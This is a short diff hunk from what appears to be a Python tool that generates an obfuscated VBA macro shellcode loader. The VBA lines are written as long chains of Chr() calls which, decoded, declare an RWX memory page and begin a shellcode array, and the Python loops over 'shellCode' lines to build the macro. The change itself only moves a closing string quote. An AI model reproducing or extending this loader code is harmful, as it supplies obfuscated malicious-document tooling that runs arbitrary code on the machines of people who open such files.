@@ -183,8 +183,7 @@ Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(115)&Chr(80)&Chr(114)&Chr(
 Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)&Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(44)& _
 Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(80)&Chr(116)&Chr(114)&Chr(10)&Chr(35)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(68)&Chr(105)&Chr(109)&Chr(32)&Chr(114)&Chr(119)& _
 Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(44)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(65)&Chr(115)&Chr(32)&Chr(76)&Chr(111)&Chr(110)&Chr(103)&Chr(10)&Chr(35)&Chr(69)&Chr(110)&Chr(100)&Chr(32)& _
-Chr(73)&Chr(102)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(61)&Chr(32)& _
-	'''
+Chr(73)&Chr(102)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(32)&Chr(61)&Chr(32)& _'''
 
 	for line in shellCode:
 		start += line + "\n"
